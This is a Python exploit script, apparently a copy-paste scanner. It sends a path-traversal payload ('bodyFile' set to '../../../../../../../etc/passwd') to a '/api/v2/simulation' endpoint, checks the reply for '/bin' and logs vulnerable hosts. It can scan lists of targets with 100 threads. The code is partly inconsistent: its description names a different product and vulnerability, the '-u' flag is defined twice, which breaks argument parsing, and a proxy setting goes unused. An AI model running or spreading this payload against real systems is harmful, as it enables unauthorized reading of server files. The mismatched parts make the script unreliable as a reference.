import argparse, sys, requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
        
        ██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
        ██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
        ███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
        ██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
        ██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██  
                                                                                                author:秋妤
                                                                                                date:2024.09.25
                                                                                                version:1.0  

    '''
    print(banner)


def poc(target):
    url = target + "/api/v2/simulation"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = """{"data": {"pairs": [{"request": {}, "response": {"bodyFile": "../../../../../../../etc/passwd", "x": "aaa"}}]},"meta": {"schemaVersion": "v5.3"}}"""

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res = requests.put(url, headers=headers, data=data, verify=False, timeout=5)
        if res.status_code == 200 and "/bin" in res.text:
            # print(res.text)
            print(f"[+] {target} 存在任意文件读取漏洞")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{target} \n")
        else:
            print(f"[-] {target} 不存在漏洞")
    except:
        print(f"[*]无法访问")


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金盘 微信管理平台 getsysteminfo 未授权访问漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()